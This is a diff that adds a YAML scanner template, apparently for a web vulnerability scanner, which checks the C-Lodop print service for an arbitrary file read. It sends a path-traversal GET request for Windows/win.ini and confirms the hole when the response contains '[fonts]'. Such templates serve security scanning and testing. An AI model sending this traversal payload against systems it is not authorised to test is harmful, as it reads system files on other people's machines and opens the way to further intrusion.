@@ -1,0 +1,12 @@
+name: C-Lodop打印服务系统-打印机-任意文件读取
+description: >-
+  读取win.ini文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /../../../../../../../../Windows/win.ini
+    expression:
+      status: 200
+      body_all:
+        - "[fonts]"
